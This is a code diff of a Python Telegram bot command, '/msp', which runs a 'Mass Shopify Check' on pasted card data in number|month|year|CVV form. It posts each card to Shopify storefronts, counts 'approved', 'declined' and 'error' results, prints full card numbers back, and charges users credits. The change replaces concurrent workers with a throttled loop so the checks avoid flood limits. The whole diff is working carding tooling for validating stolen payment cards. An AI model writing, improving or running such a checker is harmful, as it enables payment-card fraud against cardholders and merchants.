@@ -3447,7 +3447,6 @@ last_msp_usage = {}
 CARD_REGEX = re.compile(r"\d{13,19}\|\d{2}\|\d{2,4}\|\d{3,4}")
 
 
-
 # Consume credit once
 async def consume_credit(user_id: int) -> bool:
     user_data = await get_user(user_id)
@@ -3456,6 +3455,7 @@ async def consume_credit(user_id: int) -> bool:
         await update_user(user_id, credits=new_credits)
         return True
     return False
+
 
 # Shopify check request
 async def check_card(session: httpx.AsyncClient, base_url: str, site: str, card: str):
@@ -3471,6 +3471,7 @@ async def check_card(session: httpx.AsyncClient, base_url: str, site: str, card:
     except Exception as e:
         return f"Error: {e}", "false", "0", "N/A"
 
+
 # /msp command
 async def msp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -3481,7 +3482,7 @@ async def msp(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return await update.message.reply_text("⏳ Please wait 5 seconds before using /msp again.")
     last_msp_usage[user_id] = now
 
-    # Collect cards either from args or replied message
+    # Collect cards
     raw_input = None
     if context.args:
         raw_input = " ".join(context.args)
@@ -3517,7 +3518,6 @@ async def msp(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     msg = await update.message.reply_text("💳 𝐒𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐌𝐚𝐬𝐬 𝐒𝐡𝐨𝐩𝐢𝐟𝐲 𝐂𝐡𝐞𝐜𝐤…")
 
-    sem = asyncio.Semaphore(3)
     approved, declined, errors = 0, 0, 0
     checked = 0
     site_price = None
@@ -3525,79 +3525,76 @@ async def msp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     results = []
 
     async with httpx.AsyncClient() as session:
+        for i, card in enumerate(cards):
+            # Ensure card string
+            card_str = "|".join(card) if isinstance(card, (tuple, list)) else str(card)
+            card_str = card_str.replace(" ", "")
 
-        async def worker(card, first=False):
-            nonlocal approved, declined, errors, checked, site_price, gateway_used, results
+            resp, status, price, gateway = await check_card(session, base_url, site, card_str)
+            resp = str(resp)
 
-            async with sem:
-                # ensure card string
-                card_str = "|".join(card) if isinstance(card, (tuple, list)) else str(card)
-                card_str = card_str.replace(" ", "")
-
-                resp, status, price, gateway = await check_card(session, base_url, site, card_str)
-
-                resp = str(resp)
-
-                # Set site price once
-                if first and site_price is None:
-                    try:
-                        site_price = float(price)
-                    except:
-                        site_price = 0.0
-
-                if gateway and gateway != "N/A":
-                    gateway_used = gateway
-
-                resp_upper = resp.upper().strip()
-
-                # Classification
-                if "R4 TOKEN EMPTY" in resp_upper:
-                    errors += 1
-                    status_icon = "⚠️"
-                elif resp_upper in ["INCORRECT_NUMBER", "FRAUD_SUSPECTED", "CARD_DECLINED", "EXPIRE_CARD", "EXPIRED_CARD"]:
-                    declined += 1
-                    status_icon = "❌"
-                elif resp_upper in ["3D_AUTHENTICATION", "APPROVED", "SUCCESS", "INSUFFICIENT_FUNDS"]:
-                    approved += 1
-                    status_icon = "✅"
-                elif status.lower() == "true" and resp_upper not in ["CARD_DECLINED", "INCORRECT_NUMBER", "FRAUD_SUSPECTED"]:
-                    approved += 1
-                    status_icon = "✅"
-                else:
-                    errors += 1
-                    status_icon = "⚠️"
-
-                checked += 1
-
-                # Show full card
-                results.append(
-                    f"{status_icon} <code>{escape(card_str)}</code>\n ↳ <i>{escape(resp)}</i>"
-                )
-
-                # Update summary
-                summary_text = (
-                    "<pre><code>"
-                    f"📊 𝐌𝐚𝐬𝐬 𝐒𝐡𝐨𝐩𝐢𝐟𝐲 𝐂𝐡𝐞𝐜𝐤𝐞𝐫\n"
-                    f"━━━━━━━━━━━━━━━━━━━━━━━\n"
-                    f"🌍 𝑻𝒐𝒕𝒂𝒍 𝑪𝒂𝒓𝒅𝒔 : {len(cards)}\n"
-                    f"✅ 𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅    : {approved}\n"
-                    f"❌ 𝑫𝒆𝒄𝒍𝒊𝒏𝒆𝒅    : {declined}\n"
-                    f"⚠️ 𝑬𝒓𝒓𝒐𝒓       : {errors}\n"
-                    f"🔄 𝑪𝒉𝒆𝒄𝒌𝒆𝒅     : {checked} / {len(cards)}\n"
-                    f"💲 𝑺𝒊𝒕𝒆 𝑷𝒓𝒊𝒄𝒆  : ${site_price if site_price else '0.00'}\n"
-                    f"🏬 𝑮𝒂𝒕𝒆𝒘𝒂𝒚     : {gateway_used}\n"
-                    f"━━━━━━━━━━━━━━━━━━━━━━━\n"
-                    "</code></pre>\n"
-                )
-                final_text = summary_text + "\n".join(results)
-
+            # Set site price once
+            if i == 0 and site_price is None:
                 try:
-                    await msg.edit_text(final_text, parse_mode="HTML")
+                    site_price = float(price)
                 except:
-                    pass
+                    site_price = 0.0
 
-        # Run all workers
-        await asyncio.gather(*(worker(c, first=(i == 0)) for i, c in enumerate(cards)))
+            if gateway and gateway != "N/A":
+                gateway_used = gateway
+
+            resp_upper = resp.upper().strip()
+
+            # Classification
+            if "R4 TOKEN EMPTY" in resp_upper:
+                errors += 1
+                status_icon = "⚠️"
+            elif resp_upper in ["INCORRECT_NUMBER", "FRAUD_SUSPECTED", "CARD_DECLINED", "EXPIRE_CARD", "EXPIRED_CARD"]:
+                declined += 1
+                status_icon = "❌"
+            elif resp_upper in ["3D_AUTHENTICATION", "APPROVED", "SUCCESS", "INSUFFICIENT_FUNDS"]:
+                approved += 1
+                status_icon = "✅"
+            elif status.lower() == "true" and resp_upper not in ["CARD_DECLINED", "INCORRECT_NUMBER", "FRAUD_SUSPECTED"]:
+                approved += 1
+                status_icon = "✅"
+            else:
+                errors += 1
+                status_icon = "⚠️"
+
+            checked += 1
+
+            # Show full card
+            results.append(
+                f"{status_icon} <code>{escape(card_str)}</code>\n ↳ <i>{escape(resp)}</i>"
+            )
+
+            # Update summary after each card
+            summary_text = (
+                "<pre><code>"
+                f"📊 𝐌𝐚𝐬𝐬 𝐒𝐡𝐨𝐩𝐢𝐟𝐲 𝐂𝐡𝐞𝐜𝐤𝐞𝐫\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"🌍 𝑻𝒐𝒕𝒂𝒍 𝑪𝒂𝐫𝐝𝐬 : {len(cards)}\n"
+                f"✅ 𝑨𝒑𝐩𝐫𝐨𝐯𝐞𝐝    : {approved}\n"
+                f"❌ 𝑫𝐞𝐜𝐥𝐢𝐧𝐞𝐝    : {declined}\n"
+                f"⚠️ 𝑬𝐫𝐫𝐨𝐫       : {errors}\n"
+                f"🔄 𝑪𝐡𝐞𝐜𝐤𝐞𝐝     : {checked} / {len(cards)}\n"
+                f"💲 𝑺𝐢𝐭𝐞 𝑷𝐫𝐢𝐜𝐞  : ${site_price if site_price else '0.00'}\n"
+                f"🏬 𝑮𝐚𝐭𝐞𝐰𝐚𝐲     : {gateway_used}\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+                "</code></pre>\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+                f"#𝑨𝒖𝒕𝒐𝒔𝐡𝐨𝐩𝐢𝐟𝐲𝒄𝐡𝐞𝐜𝐤𝒔\n"
+                f"────────────────\n"
+            )
+            final_text = summary_text + "\n".join(results)
+
+            try:
+                await msg.edit_text(final_text, parse_mode="HTML")
+            except:
+                pass
+            await asyncio.sleep(0.5)  # small delay to avoid flood
+
 
 
 
